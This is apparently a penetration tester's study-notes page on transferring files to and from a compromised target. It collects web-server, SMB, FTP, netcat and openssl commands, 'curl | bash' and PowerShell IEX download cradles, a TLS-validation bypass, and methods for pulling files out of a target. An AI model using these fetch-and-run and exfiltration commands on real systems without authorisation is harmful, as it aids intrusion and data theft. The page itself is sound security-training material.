# Transfer files 🛅

[![filetransfers](../../../_badges/htb/filetransfers.svg)](https://academy.hackthebox.com/course/preview/file-transfers)

<div class="row row-cols-lg-2"><div>

We will often want to transfer files between your machine, and the target. Mostly during privilege escalation and post-exploitation.

According to the current environment capabilities <small>(e.g., installed tools)</small> and restrictions <small>(e.g. firewall)</small>, we will have to use different techniques.

The most common approaches from the host to the target:

* Copy-pasting <small>(short text files)</small> ✂️
* Python web server <small>(using wget/cURL/iwr as client)</small> 🐍

📚 There are also fileless techniques to avoid storing the file on the target, such as `curl xxx | bash` or other similar tricks.
</div><div>

To transfer a file from the target to the host, it's often harder and more complex. Some common approaches are:

* Copy-pasting <small>(short text files)</small> ✂️
* Moving files to the webserver directory <small>(if applicable)</small> 📂
* Python web server <small>(often available on Linux)</small> 🐍
* Using services such as SCP/FTP/SMB/NFS/... <small>(if present)</small> 🎡
* Using installed tools such as nc, php, etc. 🧯

We may use checksum functions/commands to check that the file was correctly transferred. [Refer to cryptography/hashing/checksum](/cybersecurity/cryptography/algorithms/hashing/index.md#file-checksum).
</div></div>

<hr class="sep-both">

## Sending a file to others 🔒

<i class="small">On the "host" where the file is:</i>

<div class="row row-cols-lg-2"><div>

#### Python webserver 🐍

Start a webserver allowing clients to download the files. You may try with `python2`, and `python3` if `python` is unavailable.

```shell!
$ python2.7 -m SimpleHTTPServer
$ python -m http.server port # port > 1023 | expose pwd
$ python [...] --directory /path/to/server/root
$ sudo python -m http.server port # port <= 1023
```

#### Upload To SMB Share

You can use `copy` to upload a file to a SMB share on the client:

```shell!
PS> copy file.txt \\HOST_IP\share_name\path
PS> robocopy file.txt \\HOST_IP\share_name\path
```

If guest access is not allowed, try [mounting the share](/operating-systems/networking/protocols/smb.md).
</div><div>

#### Upload To FTP Server

You can use the URL `ftp://HOST_IP/<target_file_name>` with a HTTP upload tool or the [FTP](/operating-systems/networking/protocols/ftp.md) PowerShell client:

```shell!
PS> (New-Object Net.WebClient).UploadFile('ftp://X/abc', 'C:\path\to\abc')
PS> ftp -v -n
ftp> open IP
ftp> USER anonymous
password: <blank>
ftp> dir # list files
ftp> put <file>
ftp> bye
```

#### Other webservers 🎡

You may leverage an installed web development tool/package to start a webserver allowing clients to download files:

```shell!
$ php -S 127.0.0.1:8080 # php
$ http-server -p 8080   # node "http-server" package
$ ruby -run -ehttpd . -p8080
```
</div></div>

<hr class="sep-both">

## Receiving/Fetching a file 🔑

<i class="small">On the "client" that need the file:</i>

<div class="row row-cols-lg-2"><div>

#### Using Common Utilities

The `wget` command is available on both Linux and Windows.

```shell!
$ # Download on Linux
$ wget HOST_IP:port/script.sh -o /tmp/script.sh
PS> # Download on Windows
PS> wget HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
```

You may have to use `curl` or `iws` (Windows-only) instead of `wget`.

```shell!
$ curl HOST_IP:port/script.sh -o /tmp/script.sh
PS> curl HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
PS> iws HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
```

#### Host A Simple Upload Server

Run a webserver with an upload file form, such as the one below:

```ps
$ sudo pip3 install uploadserver
$ python3 -m uploadserver
$ python3 -m uploadserver 443 --server-certificate cert.pem
```

And make the host with the file use it to upload the file.

#### Download From SMB Share

You can use `copy` to download a file from a share on the host:

```shell!
PS> copy \\HOST_IP\share_name\file_path
PS> robocopy \\HOST_IP\share_name\file_path .
```

If guest access is not allowed, try [mounting the share](/operating-systems/networking/protocols/smb.md).
</div><div>

#### Download From FTP Server

You can use the URL `ftp://HOST_IP/<file_name>` with a HTTP client such as `wget` or the [FTP](/operating-systems/networking/protocols/ftp.md) PowerShell client:

```shell!
PS> ftp -v -n
ftp> open IP
ftp> USER anonymous
password: <blank>
ftp> dir # list files
ftp> get <file>
ftp> bye
```

#### Window Utilities

A few windows commands/tools we can use:

```shell!
PS> # all are said to be faster than iwr/curl/wget
PS> (New-Object Net.WebClient).DownloadFile('URL','OUTPUT')
PS> (New-Object Net.WebClient).DownloadFileAsync('URL','OUTPUT')
PS> IEX (New-Object Net.WebClient).DownloadString('URL')
```

➡️ See also: [DownloadCradles.ps1](https://gist.github.com/HarmJ0y/bb48307ffa663256e239) <small>(0.3k ⭐)</small>. Add the `-UseBasicParsing` in case of IE errors. To disable SSL/TLS:

```shell!
PS> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
</div></div>

<hr class="sep-both">

## Additional Elements

<div class="row row-cols-lg-2"><div>

#### Copy-paste ✂️

Copy-paste may be an option, but not every file can be copy-pasted. One trick is to encode the file using [base64](/tools-and-frameworks/knowledge/encoding/index.md#base64---), copy-paste the base64 payload on a file on the target, and decode the file on the target.

<br>

#### services 🕳️

You may use FTP/SCP/NFS/SMB/... if applicable.

* [Simple SMB Server](/operating-systems/networking/protocols/smb.md) (Linux Host)
* [Simple FTP Server](/operating-systems/networking/protocols/ftp.md#simple-ftp-server) (Linux Host)

An alternative to SMB that uses HTTP is WebDav.

```shell!
$ sudo apt install python3-wsgidav
$ wsgidav --host=0.0.0.0 --port=8080 --root=/tmp/smbshare --auth=anonymous
PS> iwr -Uri "http:/IP:8080/<file>"
PS> copy \\IP\DavWWWRoot\<file> # 👻 // didn't work
PS> # unrelated: davtest -url http://IP
PS> # unrelated: curl -X MOVE -H 'Destination:xxx.php' 'xxx.txt'
```

We may be able to mount a drive using RDP. On Windows, in the options of the RDP client, we can configure the mapping too.

```shell!
$ rdesktop [...] -r disk:linux='/path/to/folder'
$ xfreerdp [...] /drive:linux,/path/to/folder
$ xfreerdp [...] /drive:/usr/share/windows-resources,share
```
</div><div>

#### netcat 🐈

```ps
# host
$ nc CLIENT_IP port < file.sh
# client
$ nc -lvp port > file.sh
$ # --recv-only | -q 0 | --send-only
```

<br>

#### File Sharing 📂

If you want to transfer a file between two Windows hosts, you can do so easily by creating a folder and sharing it.

* Right-click on the folder to share
* Navigate to Sharing > Advanced Sharing, and share it
* From the other host, use `\\SERVER_IP` from the Windows explorer
* You can also use any SMB-related commands such as `dir`
</div></div>

<hr class="sep-both">

## Fileless payloads 👻

<div class="row row-cols-lg-2"><div>

On Linux, we often use a pipe (`|`):

```shell!
$ curl [...] | bash
$ wget -qO- [...] | bash
$ [...] | python3
```
</div><div>

On Windows, we often use:

```shell!
PS> IEX [...]
PS> [...] | IEX
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [Windows File Transfer Cheatsheet](https://infinitelogins.com/2020/09/04/windows-file-transfer-cheatsheet/)
* [croc](https://github.com/schollz/croc)
* [PSUpload](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1)
* `/dev/TCP`
* can use cURL to upload files
* can use openssl like nc

```
$ openssl s_server -quiet -accept 80 -cert cert.pem -key key.pem < file
$ openssl s_client -connect IP -quiet > file
```
</div><div>
</div></div>